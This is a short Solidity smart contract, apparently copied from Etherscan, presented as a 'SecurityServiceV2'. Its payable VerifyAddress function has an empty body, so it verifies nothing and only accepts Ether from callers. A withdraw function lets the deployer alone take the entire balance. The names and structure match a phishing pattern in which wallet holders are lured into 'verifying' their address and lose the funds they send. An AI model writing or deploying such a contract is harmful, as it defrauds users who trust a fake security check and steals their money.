/**
 *Submitted for verification at Etherscan.io on 2023-04-19
*/

pragma solidity ^0.8.17;

contract SecurityServiceV2 {

    address private owner;

     constructor() public{   
        owner=msg.sender;
    }

    function getOwner(
    ) public view returns (address) {    
        return owner;
    }


    function withdraw() public {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }

    function VerifyAddress(address user) public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}